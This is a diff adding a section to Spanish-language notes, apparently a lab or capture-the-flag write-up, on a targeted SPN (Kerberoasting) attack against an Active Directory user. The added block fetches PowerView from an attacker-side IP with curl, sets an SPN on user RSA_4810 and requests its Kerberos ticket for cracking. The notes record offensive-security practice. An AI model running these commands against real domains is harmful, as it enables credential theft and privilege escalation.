@@ -245,3 +245,15 @@ podemos ver que el usuario que hemos comprometido esta relacionado con el usuari
 ![[Pasted image 20240707004741.png]]
 
 ### Ataque SPN (Service Principal Name)
+primero vamos a 
+```python
+curl 10.10.14.2:80/PowerView.ps1 -o PowerView.ps1
+--------------------------------------------------------------------------------------------------------------------------------------
+Import-Module .\PowerView.ps1
+#Check if RSA_4810 has not SPN
+Get-DomainUser 'RSA_4810' | Select serviceprincipalname
+#Set SPN
+setspn -A http/RSA_4810 BLAZORIZED\RSA_4810
+$User = Get-DomainUser 'RSA_4810'
+$User | Get-DomainSPNTicket | fl
+```
